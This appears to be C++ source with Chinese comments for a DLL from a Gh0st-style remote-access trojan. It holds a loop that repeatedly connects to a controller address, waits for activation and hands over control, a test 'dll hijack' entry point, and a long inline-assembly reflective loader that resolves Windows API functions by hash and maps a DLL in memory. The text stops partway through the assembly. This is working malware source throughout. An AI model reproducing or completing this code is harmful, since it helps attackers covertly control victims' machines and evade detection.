// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include "common/KeyboardManager.h"
#include "common/KernelManager.h"
#include "common/login.h"
#include "common/install.h"
#include <stdio.h>
#include <shlwapi.h>

#pragma comment(lib,"shlwapi.lib")
#include <iostream>
#include <fstream>

//using namespace std;


struct Connect_Address
{
	DWORD dwstact;
	char  strIP[MAX_PATH];
	int   nPort;
	char  ActiveXKeyGuid[MAX_PATH];	// 查找创建的Guid
}g_myAddress = { 0xCC28256,"",0,"" };


char	svcname[MAX_PATH];
SERVICE_STATUS_HANDLE hServiceStatus;
DWORD	g_dwCurrState;

char g_strSvchostName[MAX_PATH];//服务名
char g_strHost[MAX_PATH];
DWORD g_dwPort;
DWORD g_dwServiceType;

enum
{
	NOT_CONNECT, 			// 还没有连接
	GETLOGINFO_ERROR,		// 获取信息失败
	CONNECT_ERROR,			// 链接失败
	HEARTBEATTIMEOUT_ERROR 	// 心跳超时链接失败
};

DWORD WINAPI main(char *lpServiceName);
//处理异常
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	// 发生异常，重新创建进程
	HANDLE	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strSvchostName, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}

DWORD WINAPI main(char *lpServiceName)
{
	strcpy(g_strHost, g_myAddress.strIP);
	g_dwPort = g_myAddress.nPort;
	// lpServiceName,在ServiceMain返回后就没有了
	char	strServiceName[256] = {0};
	char	strKillEvent[50] = { 0 };
	HANDLE	hInstallMutex = NULL;
	//////////////////////////////////////////////////////////////////////////
	// Set Window Station
	HWINSTA hOldStation = GetProcessWindowStation();

	//---------------------------------------------------------------------------
	//char winsta0[] = { 0x07,0xbc,0xa3,0xa7,0xbb,0xb3,0xa7,0xf5};// winsta0
	//char* lpszWinSta = decodeStr(winsta0);						// 解密函数
	//
	//HWINSTA hWinSta = OpenWindowStation(lpszWinSta, FALSE, MAXIMUM_ALLOWED);
	//
	//memset(lpszWinSta, 0, winsta0[STR_CRY_LENGTH]);				// 填充0
	//delete lpszWinSta;											// 释放

	HWINSTA hWinSta = OpenWindowStation("winsta0", FALSE, MAXIMUM_ALLOWED);
	//---------------------------------------------------------------------------

	if (hWinSta != NULL)
		SetProcessWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////

	 // 这里判断CKeyboardManager::g_hInstance是否为空 如果不为空则开启错误处理
	 // 这里要在dllmain中为CKeyboardManager::g_hInstance赋值
	if (CKeyboardManager::g_hInstance != NULL)
	{
		//设置异常
		SetUnhandledExceptionFilter(bad_exception);

		lstrcpy(strServiceName, lpServiceName);
		wsprintf(strKillEvent, "Global\\CcRem %d", GetTickCount()); // 随机事件名
		//wsprintf(strKillEvent, "Global\\Net_%d", GetTickCount()); // 随机事件名

		hInstallMutex = CreateMutex(NULL, true, g_strHost);
		// ReConfigService(strServiceName); 
		// 删除安装文件
		// DeleteInstallFile(lpServiceName);  
	}
	// 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人
	SetErrorMode(SEM_FAILCRITICALERRORS);
	char	*lpszHost = NULL;
	DWORD	dwPort = 80;
	char	*lpszProxyHost = NULL;
	DWORD	dwProxyPort = 0;
	char	*lpszProxyUser = NULL;
	char	*lpszProxyPass = NULL;

	HANDLE	hEvent = NULL;

	//---这里声明了一个 CClientSocket类
	CClientSocket socketClient;
	BYTE	bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接

	//这个循环里判断是否连接成功如果不成功则继续向下
	while (1)
	{
		// 如果不是心跳超时，不用再sleep两分钟
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2分钟断线重连, 为了尽快响应killevent
			for (int i = 0; i < 2000; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
					break;

				}
				// 改一下
				Sleep(60);
			}
		}
		//上线地址
		lpszHost = g_strHost;
		dwPort = g_dwPort;

		if (lpszProxyHost != NULL)
			socketClient.setGlobalProxyOption(PROXY_SOCKS_VER5, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass);
		else
			socketClient.setGlobalProxyOption();

		DWORD dwTickCount = GetTickCount();
		//---调用Connect函数向主控端发起连接
		if (!socketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = CONNECT_ERROR;       //---连接错误跳出本次循环
			continue;
		}
		// 登录
		DWORD dwExitCode = SOCKET_ERROR;
		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
		// 接成功后声明了一个CKernelManager 到CKernelManager
		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
		// socketClient中的主回调函数设置位这CKernelManager类中的OnReceive 
		//（每个功能类都有OnReceive函数来处理接受的数据他们都继承自父类CManager）
		socketClient.setManagerCallBack(&manager);

		//////////////////////////////////////////////////////////////////////////
		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接，获取是否有效标志
		if (!manager.IsActived())
			continue;

		//////////////////////////////////////////////////////////////////////////

		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();// 获取时间戳

		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while (hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}
#ifdef _DLL
	//////////////////////////////////////////////////////////////////////////
	// Restor WindowStation and Desktop	
	// 不需要恢复桌面，因为如果是更新服务端的话，新服务端先运行，此进程恢复掉了卓面，会产生黑屏
	// 	SetProcessWindowStation(hOldStation);
	// 	CloseWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////
#endif

	SetErrorMode(0);
	ReleaseMutex(hInstallMutex);
	CloseHandle(hInstallMutex);
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
		//CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
		//CKeyboardManager::m_dwLastMsgTime = GetTickCount();
		//CKeyboardManager::Initialization();
		MessageBoxA(0, "dll hijack", "test", 0);
		break;
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}



extern "C" __declspec(dllexport) void TestFun(char* strHost, int nPort)
{
	strcpy(g_strHost, strHost);   // 保存上线地址
	g_dwPort = nPort;             // 保存上线端口
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strHost, 0, NULL);
	//这里等待线程结束
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
}



FILE * pFile;

long lSize;

char * buffer;

size_t result;
extern "C" __declspec(dllexport) bool InitTestReflectiveLoader()
{


		// 一个不漏地读入整个文件，只能采用二进制方式打开

		pFile = fopen(".\\..\\..\\bin\\server\\CcMainDll.dll", "rb");

		if (pFile == NULL)

		{

			fputs("File error", stderr);

			printf("open file fail");

			return false;

		}



		// 获取文件大小 

		fseek(pFile, 0, SEEK_END);

		lSize = ftell(pFile);

		rewind(pFile);



		// 分配内存存储整个文件

		buffer = (char*)malloc(sizeof(char)*lSize);

		if (buffer == NULL)

		{

			fputs("Memory error", stderr);

			printf("Memory alloc falil");

			return false;

		}



		// 将文件拷贝到buffer中 

		result = fread(buffer, 1, lSize, pFile);

		if (result != lSize)

		{

			fputs("Reading error", stderr);

			printf("Load file to memory falil");

			return false;

		}
		return true;

}



inline DWORD GetCurrentPositionAddress()
{
	_asm{
		push    ebp
		mov     ebp, esp
		mov     eax, [ebp + 4]
		pop     ebp
		retn
	}
}

inline DWORD call_ror_0xD()
{
	_asm {
		push    ebp
		mov     ebp, esp
		mov     eax, [ebp + 8]
		ror		eax, 0x0D
		pop     ebp
		retn
	}
}

inline DWORD calc_name_hash()
{
	_asm {
		push    ebp
		mov     ebp, esp
		push    ecx
		mov     [ebp-4], 0

			calc_next:
		mov     eax, [ebp-4]
		push    eax
		call    call_ror_0xD
		add     esp, 4
		mov     [ebp-4], eax
		mov     ecx, [ebp+8]
		movsx   edx, byte ptr [ecx]
		add     edx, [ebp-4]
		mov     [ebp-4], edx
		mov     eax, [ebp+8]
		add     eax, 1
		mov     [ebp+8], eax
		mov     ecx, [ebp+8]
		movsx   edx, byte ptr [ecx]
		test    edx, edx
		jnz     calc_next
		mov     eax, [ebp-4]
		mov     esp, ebp
		pop     ebp
		retn
	}
}

enum LocalEnum
{
	Nop,
	PEAddress					= 4,
	pLoadLibraryA				= 8,
	pGetProcAddress				= 0xC,
	pVirtualAlloc				= 0x10,
	pVirtualProtect				= 0x14,
	pNtFlushInstructionCache	= 0x18,

	varLocalFindPE				= 0x1c,
	varLocalFS30_A				= 0x20,		// var_8
	varLocalFS30_B				= 0x24,		// var_C
	var_4						= 0x28,		// FullDllName
	BaseDllName					= 0x2c,		// FullDllName
	name_hash					= 0x30,
	var_20						= 0x34,
	var_30						= 0x38,		// cmp_name_hash
	var_28						= 0x3c,
	exp_AddressOfNames 			= 0x40,
	AddressOfNameOrdinals		= 0x44,
	var_64						= 0x48,
	var_24						= 0x4c,
	var_3C						= 0x50,
	var_58						= 0x54,
	var_14						= 0x58,
	var_50						= 0x5c,
	var_4C						= 0x60,
	var_5C						= 0x64,
	module_handle				= 0x68,
	address						= 0x6c,
	var_60						= 0x70

};

enum LocalEnum2
{

	var_8				= 0x20,
	var_C				= 0x24

};




extern "C" __declspec(dllexport) void ReflectiveLoader()
{
	_asm{
		push    ebp
		mov     ebp, esp
		sub     esp, 0x100					// 抬高堆栈创建局部变量空间
		mov     eax, 4
		initLocalVar:						// 循环initLocalVar初始化局部变量空间为0
		mov		[ebp + eax], 0
		inc		eax
		cmp		eax ,0x100
		jnz		initLocalVar

		call    GetCurrentPositionAddress	// 获取当前位置地址
		mov		eax, buffer
		mov		[ebp + PEAddress], eax		// 保存当前代码所在的地址 PEAddress
		
		addressAdd :
		mov     eax, 1
		test    eax, eax					// 判断eax是否获取到当前地址
		jz      find_success
			
		mov     ecx, [ebp + PEAddress]		// 查找DOS头
		movzx   edx, word ptr[ecx]
		cmp     edx, 0x5A4D
		jnz    noFindFlag


        mov     eax, [ebp + PEAddress]
        mov     ecx, [eax + 0x3C]			// + 0x3C 找到DOS Header e_lfanew
        mov		[ebp + varLocalFindPE], ecx
        cmp		dword ptr[ebp + varLocalFindPE], 0x40
        jb      noFindFlag					// 地址address - 1
        cmp		dword ptr[ebp + varLocalFindPE], 0x400
        jnb     noFindFlag					// 地址address - 1

        mov     edx, [ebp + varLocalFindPE]
        add     edx, [ebp + PEAddress]
        mov		[ebp + varLocalFindPE], edx
        mov     eax, [ebp + varLocalFindPE]
        cmp     dword ptr[eax], 0x4550		// 判断PE Header Signature PE标志
        jnz     noFindFlag					// 地址address - 1
		jmp     find_success				// 找到了singtrue 跳转

			noFindFlag :
		mov     ecx, [ebp + PEAddress]		// 地址address - 1
		sub     ecx, 1
		mov		[ebp + PEAddress], ecx
		jmp		addressAdd

			find_success:
		mov     edx, fs:[0x30]				// 获取PEB结构地址
		mov		[ebp + varLocalFS30_A], edx
		mov     eax, [ebp + varLocalFS30_A]
		mov     ecx, [eax + 0x0C]			// 获取Ptr32 _PEB_LDR_DATA 进程加载模块链表(Ldr)
		mov		[ebp + varLocalFS30_A], ecx
		mov     edx, [ebp + varLocalFS30_A]
		mov     eax, [edx + 0x14]			// 获取结构中InMemoryOrderModuleList 顺序模块列表
		mov		[ebp + varLocalFS30_B], eax

			continue_find: 
		cmp		[ebp + varLocalFS30_B], 0
		jz      find_moudle_over
		mov     ecx, [ebp + varLocalFS30_B]
		mov     edx, [ecx + 0x28]			// FullDllName_buff 模块名称
		mov		[ebp + BaseDllName], edx
		mov     eax, [ebp + varLocalFS30_B]
		mov     cx, [eax + 0x24]			// UNICODE_STRING FullDllName Length
		mov		[ebp + var_4], cx			// var_4保存FullDllName字符串长度
		mov		dword ptr[ebp + name_hash], 0

			calc_hash:
		mov     edx, [ebp + name_hash]
		push    edx
		call    call_ror_0xD
		add     esp, 4
		mov		[ebp + name_hash], eax		// ror后的eax为返回值
		mov     eax, [ebp + BaseDllName]
		movzx   ecx, byte ptr[eax]
		cmp     ecx, 0x61					// 判断获取到的模块字符串的指定位置，小于跳转，地址 + 1，比对下一个字母
		jl      less_flage
		mov     edx, [ebp + BaseDllName]	// 获取名称byte
		movzx   eax, byte ptr[edx]			// eax = byte
		mov     ecx, [ebp + name_hash]		// 计算值
		lea     edx, [ecx + eax - 0x20]		// hash + FullDllName[index] - 0x20
		mov		[ebp + name_hash], edx		// 得到结果
		jmp     calc_end

			less_flage:
		add     ecx, [ebp + name_hash]
		mov[ebp + name_hash], ecx

			calc_end:
		mov     edx, [ebp + BaseDllName]	// 名称地址 + 1
		add     edx, 1
		mov		[ebp + BaseDllName], edx
		mov     ax, [ebp + var_4]			// 字符串名称长度 - 1
		sub     ax, 1
		mov		[ebp + var_4], ax
		movzx   ecx, [ebp + var_4]
		test    ecx, ecx					// 判断长度是否为0，没有为0继续计算hash
		jnz     calc_hash					// 计算简单的模块名称name_hash
			
		cmp		dword ptr[ebp + name_hash], 0x6A4ABC5B	// 6A4ABC5B = Kernel32
		jnz     no_Kernel32_hash				// 3CFA685D = ntdll
		mov     edx, [ebp + varLocalFS30_B]		// 获取结构中InMemoryOrderModuleList
		mov     eax, [edx + 0x10]
		mov		[ebp + varLocalFS30_A], eax		// +10偏移获取DllBase基址
		mov     ecx, [ebp + varLocalFS30_A]
		mov     edx, [ebp + varLocalFS30_A]
		add     edx, [ecx + 0x3C]				// 获取PE IMAGE_DOS_HRADER e_lfanew
		mov		[ebp + var_20], edx				
		mov     eax, 8
		imul    ecx, eax, 0						// imul 1, 2, 3	  2 3乘积保存到1 0获取第一项目录导出表
		mov     edx, [ebp + var_20]
		lea     eax, [edx + ecx + 0x78]			// 获取IMAGE_OPTIONAL_HEADER -> IMAGE_DATA_DIRECTORY[0] EXPORT 导出表
		mov		[ebp + exp_AddressOfNames], eax
		mov     ecx, [ebp + exp_AddressOfNames]
		mov     edx, [ebp + varLocalFS30_A]		// edx = 基地址
		add     edx, [ecx]						// edx =  基地址 + 导出表地址
		mov		[ebp + var_20], edx
		mov     eax, [ebp + var_20]				// var_20 = IMAGE_EXPORT_DIRECTORY 地址
		mov     ecx, [ebp + varLocalFS30_A]		// ecx = 基地址
		add     ecx, [eax + 0x20]				// 获取 IMAGE_EXPORT_DIRECTORY +0x20 AddressOfNames	导出的函数名称表的RVA 也就是 函数名称表
		mov		[ebp + exp_AddressOfNames], ecx
		mov     edx, [ebp + var_20]
		mov     eax, [ebp + varLocalFS30_A]
		add     eax, [edx + 0x24]				// 获取 IMAGE_EXPORT_DIRECTORY +0x24 AddressOfNameOrdinals	导出函数序号表的RVA 也就是 函数序号表
		mov		[ebp + AddressOfNameOrdinals], eax
		mov     ecx, 4
		mov		[ebp + var_4], cx				// 设置计数var_4，需要四个函数，找到一个 - 1 ，为 0 时查找完毕

			find_next_ker_fun:
		movzx   edx, [ebp+var_4]
		test    edx, edx
		jle     cmp_need_function

		mov     eax, [ebp+exp_AddressOfNames]	// exp_AddressOfNames = 函数名称表
		mov     ecx, [ebp+varLocalFS30_A]		// varLocalFS30_A = 基地址
		add     ecx, [eax]						// 获取函数名称地址
		push    ecx
		call    calc_name_hash					// 计算函数名称hash值
		add     esp, 4
		mov     [ebp+var_30], eax				// 计算的hash保存后进行比较
		cmp     dword ptr[ebp+var_30], 0xEC0E4E8E 		// 0xEC0E4E8E = LoadLibraryA
		jz      find_function_hash
		cmp     dword ptr[ebp+var_30], 0x7C0DFCAA		// 0x7C0DFCAA = GetProcAddress
		jz      find_function_hash
		cmp     dword ptr[ebp+var_30], 0x91AFCA54 		// 0x91AFCA54 = VirtualAlloc
		jz      find_function_hash
		cmp     dword ptr[ebp+var_30], 0x7946C61B 		// 0x7946C61B = VirtualProtect
		jnz     no_find_function_hash

			find_function_hash: 
		mov     edx, [ebp+var_20]				// var_20 = IMAGE_EXPORT_DIRECTORY 地址
		mov     eax, [ebp+varLocalFS30_A]
		add     eax, [edx+0x1C]					// IMAGE_EXPORT_DIRECTORY + 0x1C = AddressOfFunctions 导出的函数地址的 地址表  RVA  也就是 函数地址表  
		mov     [ebp+var_28], eax
		mov     ecx, [ebp+AddressOfNameOrdinals]// 保存序号索引
		movzx   edx, word ptr [ecx]
		mov     eax, [ebp+var_28]
		lea     ecx, [eax+edx*4]				// 序号索引IMAGE_EXPORT_DIRECTORY 找到函数地址
		mov     [ebp+var_28], ecx				// var_28  = AddressOfFunctions[AddressOfNameOrdinals]

		cmp     dword ptr[ebp+var_30], 0xEC0E4E8E
		jnz     no_LoadLibraryA
		mov     edx, [ebp+var_28]			
		mov     eax, [ebp+varLocalFS30_A]		// eax = varLocalFS30_A = 基地址
		add     eax, [edx]						// 计算得到函数地址
		mov     [ebp+LoadLibraryA], eax			// 保存到局部堆栈LoadLibraryA
		jmp     find_index_dec					// 查找下一个
			
			no_LoadLibraryA:                           
		cmp     dword ptr[ebp+var_30], 0x7C0DFCAA
		jnz     no_GetProcAddress
		mov     ecx, [ebp+var_28]
		mov     edx, [ebp+varLocalFS30_A]		// edx = varLocalFS30_A = 基地址
		add     edx, [ecx]						// 计算得到函数地址
		mov     [ebp+ pGetProcAddress], edx		// 保存到局部堆栈GetProcAddress
		jmp     find_index_dec					// 查找下一个
			
			
			no_GetProcAddress:                           
		cmp     dword ptr[ebp+var_30], 0x91AFCA54
		jnz     no_VirtualAlloc
		mov     eax, [ebp+var_28]
		mov     ecx, [ebp+varLocalFS30_A]		// ecx = varLocalFS30_A = 基地址
		add     ecx, [eax]						// 计算得到函数地址
		mov     [ebp+VirtualAlloc], ecx			// 保存到局部堆栈VirtualAlloc
		jmp     find_index_dec					// 查找下一个

			no_VirtualAlloc:
		cmp     dword ptr[ebp+var_30], 0x7946C61B
		jnz     find_index_dec
		mov     edx, [ebp+var_28]
		mov     eax, [ebp+varLocalFS30_A]		// eax = varLocalFS30_A = 基地址
		add     eax, [edx]						// 计算得到函数地址VirtualProtect
		mov     [ebp+ pVirtualProtect], eax		// 保存到局部堆栈
			
			find_index_dec:                            
		mov     cx, [ebp+var_4]					// 找到函数后 计数 - 1
		sub     cx, 1
		mov     [ebp+var_4], cx
			
			no_find_function_hash:
		mov     edx, [ebp+exp_AddressOfNames]	
		add     edx, 4
		mov     [ebp+exp_AddressOfNames], edx		// 查找下一个函数名称
		mov     eax, [ebp+AddressOfNameOrdinals]
		add     eax, 2
		mov     [ebp+AddressOfNameOrdinals], eax	// 查找下一个函数序号
		jmp     find_next_ker_fun

			cmp_need_function:                      
		jmp     check_function
				
			no_Kernel32_hash:
        cmp     dword ptr[ebp+name_hash], 0x3CFA685D 		// 0x3CFA685D = ntdll
        jnz     check_function
        mov     ecx, [ebp+varLocalFS30_B]
        mov     edx, [ecx+0x10]  					// +10偏移获取DllBase基址
        mov     [ebp+varLocalFS30_A], edx
        mov     eax, [ebp+varLocalFS30_A]
        mov     ecx, [ebp+varLocalFS30_A]
        add     ecx, [eax+0x3C]  					// 获取PE IMAGE_DOS_HRADER e_lfanew
        mov     [ebp+var_20], ecx
        mov     edx, 8
        imul    eax, edx, 0
        mov     ecx, [ebp+var_20]
        lea     edx, [ecx+eax+0x78] 				// 获取IMAGE_OPTIONAL_HEADER -> IMAGE_DATA_DIRECTORY[0] EXPORT 导出表
        mov     [ebp+exp_AddressOfNames], edx
        mov     eax, [ebp+exp_AddressOfNames]
        mov     ecx, [ebp+varLocalFS30_A] 			// ecx = 基地址
        add     ecx, [eax]     						// 基地址 + 导出表地址
        mov     [ebp+var_20], ecx
        mov     edx, [ebp+var_20]
        mov     eax, [ebp+varLocalFS30_A]
        add     eax, [edx+0x20]  					// 获取 IMAGE_EXPORT_DIRECTORY +0x20 AddressOfNames
        mov     [ebp+exp_AddressOfNames], eax
        mov     ecx, [ebp+var_20]
        mov     edx, [ebp+varLocalFS30_A]
        add     edx, [ecx+0x24]  					// 获取 IMAGE_EXPORT_DIRECTORY +0x24 AddressOfNameOrdinals
        mov     [ebp+AddressOfNameOrdinals], edx
        mov     eax, 1
        mov     [ebp+var_4], ax

			find_next_nt_fun:						// 同上面一样 
        movzx   ecx, [ebp+var_4]					// 需要一个函数 var_4 = 1
        test    ecx, ecx
        jle      check_function
        mov     edx, [ebp+exp_AddressOfNames]		// exp_AddressOfNames = 函数名称表[]
        mov     eax, [ebp+varLocalFS30_A]			// varLocalFS30_A = 基地址
        add     eax, [edx]							// 计算hash
        push    eax
        call    calc_name_hash
        add     esp, 4
        mov     [ebp+var_30], eax
        cmp     dword ptr[ebp+var_30], 0x534C0AB8 			// 0x534C0AB8 = NtFlushInstructionCache
        jnz      no_NtFlushInstructionCache
        mov     ecx, [ebp+var_20]
        mov     edx, [ebp+varLocalFS30_A]
        add     edx, [ecx+0x1C]
        mov     [ebp+var_28], edx
        mov     eax, [ebp+AddressOfNameOrdinals]
        movzx   ecx, word ptr [eax]
        mov     edx, [ebp+var_28]
        lea     eax, [edx+ecx*4]
        mov     [ebp+var_28], eax
        cmp     dword ptr[ebp+var_30], 0x534C0AB8
        jnz      find_nt_index_dec
        mov     ecx, [ebp+var_28]
        mov     edx, [ebp+varLocalFS30_A]
        add     edx, [ecx]
        mov     [ebp+pNtFlushInstructionCache], edx 	// 获取函数地址NtFlushInstructionCache保存

			find_nt_index_dec:                            
        mov     ax, [ebp+var_4]
        sub     ax, 1
        mov     [ebp+var_4], ax

			no_NtFlushInstructionCache:                            
        mov     ecx, [ebp+exp_AddressOfNames]
        add     ecx, 4
        mov     [ebp+exp_AddressOfNames], ecx
        mov     edx, [ebp+AddressOfNameOrdinals]
        add     edx, 2
        mov     [ebp+AddressOfNameOrdinals], edx
        jmp      find_next_nt_fun

			check_function:
		cmp     dword ptr[ebp+ pLoadLibraryA], 0
		jz      continue_find_function
		cmp     dword ptr[ebp+GetProcAddress], 0
		jz      continue_find_function
		cmp     dword ptr[ebp+ pVirtualAlloc], 0
		jz      continue_find_function
		cmp     dword ptr[ebp+pNtFlushInstructionCache], 0
		jz      continue_find_function
		jmp     find_moudle_over

			continue_find_function:
        mov     eax, [ebp+var_C]
        mov     ecx, [eax]
        mov     [ebp+var_C], ecx
        jmp     continue_find

			find_moudle_over:
		mov     edx, [ebp+PEAddress]
		mov     eax, [ebp+PEAddress]
        add     eax, [edx+3Ch]
        mov     [ebp+var_24], eax
        push    0x04 						// PAGE_READWRITE 区域不可执行代码，应用程序可以读写该区域
        push    0x3000           			// MEM_COMMIT | MEM_RESERV
        mov     ecx, [ebp+var_24]
        mov     edx, [ecx+0x50]  			// PE signature 0x18 + 0x38  SizeOfImage 映像装入内存后的总大小
        add     edx, 0x3C00000   			// dwSize
        push    edx
        push    0x0
        call    [ebp+ pVirtualAlloc]			// 申请一块 3C0000+SizeOfImage大小的内存
        mov     [ebp+var_8], eax			// var_8 = mem_address
        mov     eax, [ebp+var_24]			// var_24 = signature
        mov     ecx, [eax+0x54]				// ecx = SizeOfHeaders 0x18 + 0x3c
        mov     [ebp+var_C], ecx
        mov     edx, [ebp+PEAddress]		// PEAddress = 4D5A address
        mov     [ebp+BaseDllName], edx		// BaseDllName = PEAddress
        mov     eax, [ebp+var_8]
        mov     [ebp+name_hash], eax		// name_hash = mem_address
        mov     ecx, [ebp+var_24]
        movzx   edx, word ptr [ecx+0x14]	// edx = WORD SizeOfOptionalHeader
        mov     eax, [ebp+var_24]
        lea     ecx, [eax+edx+0x18]			// signature + SizeOfOptionalHeader + sizeof signature =  struct _IMAGE_SECTION_HEADER address 区段地址
        mov     [ebp+var_C], ecx			// var_C = 区段地址
        mov     edx, [ebp+var_24]
        movzx   eax, word ptr [edx+0x06]	// signature + 0x04 + 0x02
		mov     [ebp+var_3C], eax			// var_3C = NumberOfSections 节的数量
		
			loc_463585:	
        mov     ecx, [ebp+var_3C]
        mov     [ebp+var_58], ecx			// var_58 = 剩余要处理的Sections数量 index
        mov     edx, [ebp+var_3C]
        sub     edx, 1
        mov     [ebp+var_3C], edx
        cmp     dword ptr[ebp+var_58], 0				// 区段是否都处理了 
        jz      loc_463614
        mov     eax, [ebp+var_C]			// var_C = 区段地址
        mov     ecx, [ebp+var_8]			// var_8 = mem_address
        add     ecx, [eax+0x0C]				// 申请的地址计算 基址 + 区段地址 +0x0c =  struct _IMAGE_SECTION_HEADER->VirtualAddress 节区的 RVA 地址
        mov     [ebp+BaseDllName], ecx		// BaseDllName = SECTION VirtualAddress new mem 新地址
        mov     edx, [ebp+var_C]
        mov     eax, [ebp+PEAddress]		// eax = 4D5A address
        add     eax, [edx+0x14]				// 取值 4D5A address + PointerToRawData = 区段地址 + 0x14 =  struct _IMAGE_SECTION_HEADER->PointerToRawData 文件中区段偏移
        mov     [ebp+name_hash], eax		// name_hash = _IMAGE_SECTION_HEADER->PointerToRawData	在文件中的偏移量
        mov     ecx, [ebp+var_C]			// var_C = 区段地址
        mov     edx, [ecx+0x10]				// 
        mov     [ebp+var_14], edx			// var_14 = _IMAGE_SECTION_HEADER->SizeOfRawData 	在文件中对齐后的尺寸
        cmp     dword ptr[ebp+var_50], 0
        jnz     loc_4635C7
        mov     eax, [ebp+BaseDllName]
		mov     [ebp+var_50], eax			// var_50 = SECTION VirtualAddress new mem 新地址
		
			loc_4635C7:
		cmp     dword ptr[ebp+var_4C], 0
		jnz     loc_4635D3
		mov     ecx, [ebp+var_14]
		mov     [ebp+var_4C], ecx			// var_4C = SizeOfRawData

			loc_4635D3:
        mov     edx, [ebp+var_14]
        mov     [ebp+var_5C], edx			// var_5C = SizeOfRawData
        mov     eax, [ebp+var_14]
        sub     eax, 1						// 拷贝计数size - 1
        mov     [ebp+var_14], eax			// var_14 = SizeOfRawData 在文件中对齐后的尺寸 - 1
        cmp     dword ptr[ebp+var_5C], 0				// 为 0 拷贝完成
        jz      loc_463606
        mov     ecx, [ebp+BaseDllName]		// BaseDllName = SECTION VirtualAddress new mem 新地址
        mov     edx, [ebp+name_hash]		// PointerToRawData
        mov     al, [edx]					// 得到文件中的区段数据
        mov     [ecx], al					// 拷贝到申请的mem中 算出来的偏移VirtualAddress
        mov     ecx, [ebp+BaseDllName]
        add     ecx, 1						// 新的内存地址 + 1
        mov     [ebp+BaseDllName], ecx
        mov     edx, [ebp+name_hash]		// 文件内存地址 + 1
        add     edx, 1
        mov     [ebp+name_hash], edx
		jmp     loc_4635D3					// 跳转后文件对其尺寸 - 1 为 0 时区段拷贝完毕
		
			loc_463606:
    	mov     eax, [ebp+var_C]			// var_C = 区段地址
    	add     eax, 0x28
    	mov     [ebp+var_C], eax			// 下一个区段
		jmp     loc_463585
		
			loc_463614: 
		mov     ecx, 8
		shl     ecx, 0						//  [1] 数据目录表第二项 导入表 IMAGE_DIRECTORY_ENTRY_IMPORT 
		mov     edx, [ebp+var_24]			// var_24 = signature
		lea     eax, [edx+ecx+0x78]			//  0x78 + 0x08
		mov     [ebp+BaseDllName], eax	
		mov     ecx, [ebp+BaseDllName]
		mov     edx, [ebp+var_8]			// var_8 = mem_address
		add     edx, [ecx]					// mem_address + VirtualAddress
		mov     [ebp+name_hash], edx		// name_hash = 申请地址的导入表
			loc_463631:
        mov     eax, [ebp+name_hash]
        cmp     dword ptr [eax+0x0C], 0		// 判断 模块名称 0x0c _IMAGE_EXPORT_DIRECTORY Name
        jz      loc_463729
        mov     ecx, [ebp+name_hash]		// name_hash = 申请地址的导入表
        mov     edx, [ebp+var_8]			// var_8 = mem_address
        add     edx, [ecx+0x0C]				// 名称读取  dllName
        push    edx
        call    [ebp+ pLoadLibraryA]		// 获取模块句柄
		mov     [ebp+module_handle], eax	// module_handle = 模块句柄
		
		mov     eax, [ebp+name_hash]		// name_hash = 申请地址的导入表
		mov     ecx, [ebp+var_8]			// var_8 = mem_address
		add     ecx, [eax]					// 找到新内存的导入表位置
		mov     [ebp+var_14], ecx			// var_14 = new_mem_import
		mov     edx, [ebp+name_hash]
		mov     eax, [ebp+var_8]
		add     eax, [edx+0x10]				// IMAGE_IMPORT_DESCRIPTOR -> FirstThunk
		mov     [ebp+var_C], eax			// var_C = MAGE_IMPORT_DESCRIPTOR -> FirstThunk

loc_463665:                          
		mov     ecx, [ebp+var_C]
		cmp     dword ptr [ecx], 0			// 判断FirstThunk是否为0
		jz      loc_46371B					// 为0跳转
		cmp     dword ptr[ebp+var_14], 0				// 判断新内存的导入表是否为
		jz      loc_4636E0
		mov     edx, [ebp+var_14]
		mov     eax, [edx]
		and     eax, 0x80000000				// 当IMAGE_THUNK_DATA 结构体最高位为1时，表示函数以序号导入，此时低31位被看成函数序号使用。
		jz      loc_4636E0			
		mov     ecx, [ebp+module_handle]	// 序号获取导出函数
		mov     edx, [ebp+module_handle]
		add     edx, [ecx+0x3C]
		mov     [ebp+var_20], edx
		mov     eax, 8
		imul    ecx, eax, 0
		mov     edx, [ebp+var_20]
		lea     eax, [edx+ecx+0x78]
		mov     [ebp+exp_AddressOfNames], eax
		mov     ecx, [ebp+exp_AddressOfNames]
